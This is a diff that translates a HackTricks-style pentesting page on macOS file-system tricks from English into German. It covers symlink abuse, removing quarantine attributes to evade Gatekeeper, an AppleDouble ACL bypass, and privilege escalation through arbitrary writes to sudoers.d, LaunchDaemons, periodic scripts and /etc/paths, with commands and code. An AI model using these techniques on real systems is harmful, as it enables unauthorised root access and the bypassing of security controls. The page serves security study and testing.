@@ -2,74 +2,69 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-## POSIX permissions combinations
+## POSIX-Berechtigungskombinationen
 
-Permissions in a **directory**:
+Berechtigungen in einem **Verzeichnis**:
 
-- **read** - you can **enumerate** the directory entries
-- **write** - you can **delete/write** **files** in the directory and you can **delete empty folders**.
-  - But you **cannot delete/modify non-empty folders** unless you have write permissions over it.
-  - You **cannot modify the name of a folder** unless you own it.
-- **execute** - you are **allowed to traverse** the directory - if you don’t have this right, you can’t access any files inside it, or in any subdirectories.
+- **lesen** - Sie können die **Einträge** im Verzeichnis **auflisten**.
+- **schreiben** - Sie können **Dateien** im Verzeichnis **löschen/schreiben** und Sie können **leere Ordner löschen**.
+- Aber Sie **können keine nicht-leeren Ordner löschen/ändern**, es sei denn, Sie haben Schreibberechtigungen dafür.
+- Sie **können den Namen eines Ordners nicht ändern**, es sei denn, Sie besitzen ihn.
+- **ausführen** - Sie dürfen das Verzeichnis **durchqueren** - wenn Sie dieses Recht nicht haben, können Sie auf keine Dateien darin oder in Unterverzeichnissen zugreifen.
 
-### Dangerous Combinations
+### Gefährliche Kombinationen
 
-**How to overwrite a file/folder owned by root**, but:
+**Wie man eine Datei/einen Ordner, der root gehört, überschreibt**, aber:
 
-- One parent **directory owner** in the path is the user
-- One parent **directory owner** in the path is a **users group** with **write access**
-- A users **group** has **write** access to the **file**
+- Ein übergeordneter **Verzeichnisbesitzer** im Pfad ist der Benutzer
+- Ein übergeordneter **Verzeichnisbesitzer** im Pfad ist eine **Benutzergruppe** mit **Schreibzugriff**
+- Eine Benutzer**gruppe** hat **Schreib**zugriff auf die **Datei**
 
-With any of the previous combinations, an attacker could **inject** a **sym/hard link** the expected path to obtain a privileged arbitrary write.
+Mit einer der vorherigen Kombinationen könnte ein Angreifer einen **sym/hard link** in den erwarteten Pfad **einspeisen**, um einen privilegierten beliebigen Schreibzugriff zu erhalten.
 
-### Folder root R+X Special case
+### Ordner root R+X Sonderfall
 
-If there are files in a **directory** where **only root has R+X access**, those are **not accessible to anyone else**. So a vulnerability allowing to **move a file readable by a user**, that cannot be read because of that **restriction**, from this folder **to a different one**, could be abuse to read these files.
+Wenn es Dateien in einem **Verzeichnis** gibt, in dem **nur root R+X-Zugriff hat**, sind diese **für niemanden sonst zugänglich**. Eine Schwachstelle, die es ermöglicht, eine von einem Benutzer lesbare Datei, die aufgrund dieser **Einschränkung** nicht gelesen werden kann, von diesem Ordner **in einen anderen** zu **verschieben**, könnte ausgenutzt werden, um diese Dateien zu lesen.
 
-Example in: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)
+Beispiel in: [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/#nix-directory-permissions)
 
-## Symbolic Link / Hard Link
+## Symbolischer Link / Harte Verknüpfung
 
-If a privileged process is writing data in **file** that could be **controlled** by a **lower privileged user**, or that could be **previously created** by a lower privileged user. The user could just **point it to another file** via a Symbolic or Hard link, and the privileged process will write on that file.
+Wenn ein privilegierter Prozess Daten in eine **Datei** schreibt, die von einem **weniger privilegierten Benutzer** **kontrolliert** werden könnte oder die **zuvor von einem weniger privilegierten Benutzer erstellt** worden sein könnte. Der Benutzer könnte einfach **auf eine andere Datei** über einen symbolischen oder harten Link **verweisen**, und der privilegierte Prozess wird in dieser Datei schreiben.
 
-Check in the other sections where an attacker could **abuse an arbitrary write to escalate privileges**.
+Überprüfen Sie in den anderen Abschnitten, wo ein Angreifer **einen beliebigen Schreibzugriff ausnutzen könnte, um Privilegien zu eskalieren**.
 
 ## .fileloc
 
-Files with **`.fileloc`** extension can point to other applications or binaries so when they are open, the application/binary will be the one executed.\
-Example:
-
+Dateien mit der **`.fileloc`**-Erweiterung können auf andere Anwendungen oder Binärdateien verweisen, sodass beim Öffnen die Anwendung/Binärdatei ausgeführt wird.\
+Beispiel:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    <key>URL</key>
-    <string>file:///System/Applications/Calculator.app</string>
-    <key>URLPrefix</key>
-    <integer>0</integer>
+<key>URL</key>
+<string>file:///System/Applications/Calculator.app</string>
+<key>URLPrefix</key>
+<integer>0</integer>
 </dict>
 </plist>
 ```
-
 ## Arbitrary FD
 
-If you can make a **process open a file or a folder with high privileges**, you can abuse **`crontab`** to open a file in `/etc/sudoers.d` with **`EDITOR=exploit.py`**, so the `exploit.py` will get the FD to the file inside `/etc/sudoers` and abuse it.
+Wenn Sie einen **Prozess dazu bringen können, eine Datei oder einen Ordner mit hohen Rechten zu öffnen**, können Sie **`crontab`** missbrauchen, um eine Datei in `/etc/sudoers.d` mit **`EDITOR=exploit.py`** zu öffnen, sodass `exploit.py` den FD zur Datei in `/etc/sudoers` erhält und ihn ausnutzt.
 
-For example: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)
+Zum Beispiel: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)
 
-## Avoid quarantine xattrs tricks
+## Vermeiden Sie Quarantäne-xattrs-Tricks
 
-### Remove it
-
+### Entfernen Sie es
 ```bash
 xattr -d com.apple.quarantine /path/to/file_or_app
 ```
+### uchg / uchange / uimmutable-Flag
 
-### uchg / uchange / uimmutable flag
-
-If a file/folder has this immutable attribute it won't be possible to put an xattr on it
-
+Wenn eine Datei/ein Ordner dieses unveränderliche Attribut hat, ist es nicht möglich, ein xattr darauf zu setzen.
 ```bash
 echo asd > /tmp/asd
 chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
@@ -79,11 +74,9 @@ xattr: [Errno 1] Operation not permitted: '/tmp/asd'
 ls -lO /tmp/asd
 # check the "uchg" in the output
 ```
-
 ### defvfs mount
 
-A **devfs** mount **doesn't support xattr**, more info in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
-
+Ein **devfs**-Mount **unterstützt keine xattr**, weitere Informationen in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
 ```bash
 mkdir /tmp/mnt
 mount_devfs -o noowners none "/tmp/mnt"
@@ -92,11 +85,9 @@ mkdir /tmp/mnt/lol
 xattr -w com.apple.quarantine "" /tmp/mnt/lol
 xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
 ```
-
 ### writeextattr ACL
 
-This ACL prevents from adding `xattrs` to the file
-
+Diese ACL verhindert das Hinzufügen von `xattrs` zur Datei.
 ```bash
 rm -rf /tmp/test*
 echo test >/tmp/test
@@ -117,17 +108,15 @@ open test.zip
 sleep 1
 ls -le /tmp/test
 ```
-
 ### **com.apple.acl.text xattr + AppleDouble**
 
-**AppleDouble** file format copies a file including its ACEs.
+Das **AppleDouble**-Dateiformat kopiert eine Datei einschließlich ihrer ACEs.
 
-In the [**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) it's possible to see that the ACL text representation stored inside the xattr called **`com.apple.acl.text`** is going to be set as ACL in the decompressed file. So, if you compressed an application into a zip file with **AppleDouble** file format with an ACL that prevents other xattrs to be written to it... the quarantine xattr wasn't set into de application:
+Im [**Quellcode**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) ist zu sehen, dass die ACL-Textdarstellung, die im xattr mit dem Namen **`com.apple.acl.text`** gespeichert ist, als ACL in der dekomprimierten Datei gesetzt wird. Wenn Sie also eine Anwendung in eine Zip-Datei mit dem **AppleDouble**-Dateiformat komprimiert haben, mit einer ACL, die das Schreiben anderer xattrs verhindert... wurde das Quarantäne-xattr nicht in die Anwendung gesetzt:
 
-Check the [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) for more information.
+Überprüfen Sie den [**ursprünglichen Bericht**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) für weitere Informationen.
 
-To replicate this we first need to get the correct acl string:
-
+Um dies zu replizieren, müssen wir zuerst den richtigen ACL-String erhalten:
 ```bash
 # Everything will be happening here
 mkdir /tmp/temp_xattrs
@@ -145,7 +134,6 @@ ditto -c -k del test.zip
 ditto -x -k --rsrc test.zip .
 ls -le test
 ```
-
 (Note that even if this works the sandbox write the quarantine xattr before)
 
 Not really needed but I leave it there just in case:
@@ -154,66 +142,61 @@ Not really needed but I leave it there just in case:
 macos-xattr-acls-extra-stuff.md
 {{#endref}}
 
-## Bypass Code Signatures
+## Umgehung von Codesignaturen
 
-Bundles contains the file **`_CodeSignature/CodeResources`** which contains the **hash** of every single **file** in the **bundle**. Note that the hash of CodeResources is also **embedded in the executable**, so we can't mess with that, either.
+Bundles enthalten die Datei **`_CodeSignature/CodeResources`**, die den **Hash** jeder einzelnen **Datei** im **Bundle** enthält. Beachten Sie, dass der Hash von CodeResources auch **in der ausführbaren Datei eingebettet** ist, sodass wir damit ebenfalls nichts anstellen können.
 
-However, there are some files whose signature won't be checked, these have the key omit in the plist, like:
-
+Es gibt jedoch einige Dateien, deren Signatur nicht überprüft wird; diese haben den Schlüssel omit in der plist, wie:
 ```xml
 <dict>
 ...
-	<key>rules</key>
-	<dict>
+<key>rules</key>
+<dict>
 ...
-		<key>^Resources/.*\.lproj/locversion.plist$</key>
-		<dict>
-			<key>omit</key>
-			<true/>
-			<key>weight</key>
-			<real>1100</real>
-		</dict>
+<key>^Resources/.*\.lproj/locversion.plist$</key>
+<dict>
+<key>omit</key>
+<true/>
+<key>weight</key>
+<real>1100</real>
+</dict>
 ...
-	</dict>
-	<key>rules2</key>
+</dict>
+<key>rules2</key>
 ...
-		<key>^(.*/)?\.DS_Store$</key>
-		<dict>
-			<key>omit</key>
-			<true/>
-			<key>weight</key>
-			<real>2000</real>
-		</dict>
+<key>^(.*/)?\.DS_Store$</key>
+<dict>
+<key>omit</key>
+<true/>
+<key>weight</key>
+<real>2000</real>
+</dict>
 ...
-		<key>^PkgInfo$</key>
-		<dict>
-			<key>omit</key>
-			<true/>
-			<key>weight</key>
-			<real>20</real>
-		</dict>
+<key>^PkgInfo$</key>
+<dict>
+<key>omit</key>
+<true/>
+<key>weight</key>
+<real>20</real>
+</dict>
 ...
-		<key>^Resources/.*\.lproj/locversion.plist$</key>
-		<dict>
-			<key>omit</key>
-			<true/>
-			<key>weight</key>
-			<real>1100</real>
-		</dict>
+<key>^Resources/.*\.lproj/locversion.plist$</key>
+<dict>
+<key>omit</key>
+<true/>
+<key>weight</key>
+<real>1100</real>
+</dict>
 ...
 </dict>
 ```
-
-It's possible to calculate the signature of a resource from the cli with:
-
+Es ist möglich, die Signatur einer Ressource über die CLI mit folgendem Befehl zu berechnen:
 ```bash
 openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
 ```
-
 ## Mount dmgs
 
-A user can mount a custom dmg created even on top of some existing folders. This is how you could create a custom dmg package with custom content:
-
+Ein Benutzer kann ein benutzerdefiniertes dmg, das sogar über einigen vorhandenen Ordnern erstellt wurde, einbinden. So könnten Sie ein benutzerdefiniertes dmg-Paket mit benutzerdefiniertem Inhalt erstellen:
 ```bash
 # Create the volume
 hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
@@ -234,55 +217,51 @@ hdiutil detach /private/tmp/mnt 1>/dev/null
 # You can also create a dmg from an app using:
 hdiutil create -srcfolder justsome.app justsome.dmg
 ```
+Normalerweise mountet macOS Festplatten, indem es mit dem `com.apple.DiskArbitrarion.diskarbitrariond` Mach-Dienst (bereitgestellt von `/usr/libexec/diskarbitrationd`) kommuniziert. Wenn man den Parameter `-d` zur LaunchDaemons plist-Datei hinzufügt und neu startet, werden die Protokolle in `/var/log/diskarbitrationd.log` gespeichert.\
+Es ist jedoch möglich, Tools wie `hdik` und `hdiutil` zu verwenden, um direkt mit dem `com.apple.driver.DiskImages` kext zu kommunizieren.
 
-Usually macOS mounts disk talking to the `com.apple.DiskArbitrarion.diskarbitrariond` Mach service (provided by `/usr/libexec/diskarbitrationd`). If adding the param `-d` to the LaunchDaemons plist file and restarted, it will store logs it will store logs in `/var/log/diskarbitrationd.log`.\
-However, it's possible to use tools like `hdik` and `hdiutil` to communicate directly with the `com.apple.driver.DiskImages` kext.
+## Arbiträre Schreibvorgänge
 
-## Arbitrary Writes
+### Periodische sh-Skripte
 
-### Periodic sh scripts
+Wenn Ihr Skript als **Shell-Skript** interpretiert werden könnte, könnten Sie das **`/etc/periodic/daily/999.local`** Shell-Skript überschreiben, das jeden Tag ausgelöst wird.
 
-If your script could be interpreted as a **shell script** you could overwrite the **`/etc/periodic/daily/999.local`** shell script that will be triggered every day.
-
-You can **fake** an execution of this script with: **`sudo periodic daily`**
+Sie können eine Ausführung dieses Skripts fälschen mit: **`sudo periodic daily`**
 
 ### Daemons
 
-Write an arbitrary **LaunchDaemon** like **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** with a plist executing an arbitrary script like:
-
+Schreiben Sie einen beliebigen **LaunchDaemon** wie **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** mit einer plist, die ein beliebiges Skript ausführt wie:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
-    <dict>
-        <key>Label</key>
-        <string>com.sample.Load</string>
-        <key>ProgramArguments</key>
-        <array>
-            <string>/Applications/Scripts/privesc.sh</string>
-        </array>
-        <key>RunAtLoad</key>
-        <true/>
-    </dict>
+<dict>
+<key>Label</key>
+<string>com.sample.Load</string>
+<key>ProgramArguments</key>
+<array>
+<string>/Applications/Scripts/privesc.sh</string>
+</array>
+<key>RunAtLoad</key>
+<true/>
+</dict>
 </plist>
 ```
+Erstellen Sie einfach das Skript `/Applications/Scripts/privesc.sh` mit den **Befehlen**, die Sie als root ausführen möchten.
 
-Just generate the script `/Applications/Scripts/privesc.sh` with the **commands** you would like to run as root.
+### Sudoers-Datei
 
-### Sudoers File
+Wenn Sie **willkürlichen Schreibzugriff** haben, könnten Sie eine Datei im Ordner **`/etc/sudoers.d/`** erstellen, die Ihnen **sudo**-Rechte gewährt.
 
-If you have **arbitrary write**, you could create a file inside the folder **`/etc/sudoers.d/`** granting yourself **sudo** privileges.
+### PATH-Dateien
 
-### PATH files
+Die Datei **`/etc/paths`** ist einer der Hauptorte, die die PATH-Umgebungsvariable befüllen. Sie müssen root sein, um sie zu überschreiben, aber wenn ein Skript von einem **privilegierten Prozess** einen **Befehl ohne den vollständigen Pfad** ausführt, könnten Sie in der Lage sein, es zu **übernehmen**, indem Sie diese Datei ändern.
 
-The file **`/etc/paths`** is one of the main places that populates the PATH env variable. You must be root to overwrite it, but if a script from **privileged process** is executing some **command without the full path**, you might be able to **hijack** it modifying this file.
+Sie können auch Dateien in **`/etc/paths.d`** schreiben, um neue Ordner in die `PATH`-Umgebungsvariable zu laden.
 
-You can also write files in **`/etc/paths.d`** to load new folders into the `PATH` env variable.
+## Schreibbare Dateien als andere Benutzer generieren
 
-## Generate writable files as other users
-
-This will generate a file that belongs to root that is writable by me ([**code from here**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh)). This might also work as privesc:
-
+Dies wird eine Datei erstellen, die root gehört und von mir beschreibbar ist ([**Code von hier**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh)). Dies könnte auch als privesc funktionieren:
 ```bash
 DIRNAME=/usr/local/etc/periodic/daily
 
@@ -294,15 +273,13 @@ MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDont
 FILENAME=$(ls "$DIRNAME")
 echo $FILENAME
 ```
-
 ## POSIX Shared Memory
 
-**POSIX shared memory** allows processes in POSIX-compliant operating systems to access a common memory area, facilitating faster communication compared to other inter-process communication methods. It involves creating or opening a shared memory object with `shm_open()`, setting its size with `ftruncate()`, and mapping it into the process's address space using `mmap()`. Processes can then directly read from and write to this memory area. To manage concurrent access and prevent data corruption, synchronization mechanisms such as mutexes or semaphores are often used. Finally, processes unmap and close the shared memory with `munmap()` and `close()`, and optionally remove the memory object with `shm_unlink()`. This system is especially effective for efficient, fast IPC in environments where multiple processes need to access shared data rapidly.
+**POSIX Shared Memory** ermöglicht es Prozessen in POSIX-konformen Betriebssystemen, auf einen gemeinsamen Speicherbereich zuzugreifen, was eine schnellere Kommunikation im Vergleich zu anderen Methoden der interprozesslichen Kommunikation ermöglicht. Es beinhaltet das Erstellen oder Öffnen eines Shared-Memory-Objekts mit `shm_open()`, das Festlegen seiner Größe mit `ftruncate()` und das Mappen in den Adressraum des Prozesses mit `mmap()`. Prozesse können dann direkt aus diesem Speicherbereich lesen und schreiben. Um den gleichzeitigen Zugriff zu verwalten und Datenkorruption zu verhindern, werden häufig Synchronisationsmechanismen wie Mutexes oder Semaphoren verwendet. Schließlich entmappen und schließen die Prozesse den Shared Memory mit `munmap()` und `close()`, und entfernen optional das Speicherobjekt mit `shm_unlink()`. Dieses System ist besonders effektiv für effiziente, schnelle IPC in Umgebungen, in denen mehrere Prozesse schnell auf gemeinsame Daten zugreifen müssen.
 
 <details>
 
 <summary>Producer Code Example</summary>
-
 ```c
 // gcc producer.c -o producer -lrt
 #include <fcntl.h>
@@ -313,46 +290,44 @@ echo $FILENAME
 #include <stdlib.h>
 
 int main() {
-    const char *name = "/my_shared_memory";
-    const int SIZE = 4096; // Size of the shared memory object
+const char *name = "/my_shared_memory";
+const int SIZE = 4096; // Size of the shared memory object
 
-    // Create the shared memory object
-    int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
-    if (shm_fd == -1) {
-        perror("shm_open");
-        return EXIT_FAILURE;
-    }
+// Create the shared memory object
+int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
+if (shm_fd == -1) {
+perror("shm_open");
+return EXIT_FAILURE;
+}
 
-    // Configure the size of the shared memory object
-    if (ftruncate(shm_fd, SIZE) == -1) {
-        perror("ftruncate");
-        return EXIT_FAILURE;
-    }
+// Configure the size of the shared memory object
+if (ftruncate(shm_fd, SIZE) == -1) {
+perror("ftruncate");
+return EXIT_FAILURE;
+}
 
-    // Memory map the shared memory
-    void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
-    if (ptr == MAP_FAILED) {
-        perror("mmap");
-        return EXIT_FAILURE;
-    }
+// Memory map the shared memory
+void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
+if (ptr == MAP_FAILED) {
+perror("mmap");
+return EXIT_FAILURE;
+}
 
-    // Write to the shared memory
-    sprintf(ptr, "Hello from Producer!");
+// Write to the shared memory
+sprintf(ptr, "Hello from Producer!");
 
-    // Unmap and close, but do not unlink
-    munmap(ptr, SIZE);
-    close(shm_fd);
+// Unmap and close, but do not unlink
+munmap(ptr, SIZE);
+close(shm_fd);
 
-    return 0;
+return 0;
 }
 ```
-
 </details>
 
 <details>
 
-<summary>Consumer Code Example</summary>
-
+<summary>Beispiel für Verbrauchercode</summary>
 ```c
 // gcc consumer.c -o consumer -lrt
 #include <fcntl.h>
@@ -363,51 +338,49 @@ int main() {
 #include <stdlib.h>
 
 int main() {
-    const char *name = "/my_shared_memory";
-    const int SIZE = 4096; // Size of the shared memory object
+const char *name = "/my_shared_memory";
+const int SIZE = 4096; // Size of the shared memory object
 
-    // Open the shared memory object
-    int shm_fd = shm_open(name, O_RDONLY, 0666);
-    if (shm_fd == -1) {
-        perror("shm_open");
-        return EXIT_FAILURE;
-    }
+// Open the shared memory object
+int shm_fd = shm_open(name, O_RDONLY, 0666);
+if (shm_fd == -1) {
+perror("shm_open");
+return EXIT_FAILURE;
+}
 
-    // Memory map the shared memory
-    void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
-    if (ptr == MAP_FAILED) {
-        perror("mmap");
-        return EXIT_FAILURE;
-    }
+// Memory map the shared memory
+void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
+if (ptr == MAP_FAILED) {
+perror("mmap");
+return EXIT_FAILURE;
+}
 
-    // Read from the shared memory
-    printf("Consumer received: %s\n", (char *)ptr);
+// Read from the shared memory
+printf("Consumer received: %s\n", (char *)ptr);
 
-    // Cleanup
-    munmap(ptr, SIZE);
-    close(shm_fd);
-    shm_unlink(name); // Optionally unlink
+// Cleanup
+munmap(ptr, SIZE);
+close(shm_fd);
+shm_unlink(name); // Optionally unlink
 
-    return 0;
+return 0;
 }
 
 ```
-
 </details>
 
-## macOS Guarded Descriptors
+## macOS Geschützte Deskriptoren
 
-**macOSCguarded descriptors** are a security feature introduced in macOS to enhance the safety and reliability of **file descriptor operations** in user applications. These guarded descriptors provide a way to associate specific restrictions or "guards" with file descriptors, which are enforced by the kernel.
+**macOS geschützte Deskriptoren** sind eine Sicherheitsfunktion, die in macOS eingeführt wurde, um die Sicherheit und Zuverlässigkeit von **Dateideskriptoroperationen** in Benutzeranwendungen zu verbessern. Diese geschützten Deskriptoren bieten eine Möglichkeit, spezifische Einschränkungen oder "Schutzmaßnahmen" mit Dateideskriptoren zu verknüpfen, die vom Kernel durchgesetzt werden.
 
-This feature is particularly useful for preventing certain classes of security vulnerabilities such as **unauthorized file access** or **race conditions**. These vulnerabilities occurs when for example a thread is accessing a file description giving **another vulnerable thread access over it** or when a file descriptor is **inherited** by a vulnerable child process. Some functions related to this functionality are:
+Diese Funktion ist besonders nützlich, um bestimmte Klassen von Sicherheitsanfälligkeiten wie **unbefugten Dateizugriff** oder **Rennbedingungen** zu verhindern. Diese Anfälligkeiten treten auf, wenn beispielsweise ein Thread auf eine Dateibeschreibung zugreift und **einem anderen anfälligen Thread Zugriff darauf gewährt** oder wenn ein Dateideskriptor von einem anfälligen Kindprozess **vererbt** wird. Einige Funktionen, die mit dieser Funktionalität zusammenhängen, sind:
 
-- `guarded_open_np`: Opend a FD with a guard
-- `guarded_close_np`: Close it
-- `change_fdguard_np`: Change guard flags on a descriptor (even removing the guard protection)
+- `guarded_open_np`: Öffnet einen FD mit einem Schutz
+- `guarded_close_np`: Schließt ihn
+- `change_fdguard_np`: Ändert die Schutzflags eines Deskriptors (sogar das Entfernen des Schutzes)
 
-## References
+## Referenzen
 
 - [https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/](https://theevilbit.github.io/posts/exploiting_directory_permissions_on_macos/)
 
 {{#include ../../../../banners/hacktricks-training.md}}
-
